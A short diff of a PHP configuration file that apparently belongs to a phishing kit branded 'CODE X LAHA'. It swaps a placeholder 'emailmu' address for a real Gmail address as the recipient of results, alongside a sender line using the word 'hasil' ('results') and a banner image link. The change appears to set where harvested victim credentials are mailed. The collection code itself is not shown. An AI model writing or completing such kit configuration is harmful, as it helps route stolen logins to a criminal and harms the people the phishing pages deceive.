@@ -2,7 +2,7 @@
 
 <?php
 
-    $emailku = "emailmu@gmail.com";
+    $emailku = "ampasashu@gmail.com";
     $sender = "From: CODE X LAHA <hasil@arpanrizki.my.id>";
     $banner = "https://i.ibb.co/5K3s0Vv/arpantek-banner-v2.png";
     $more = '<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
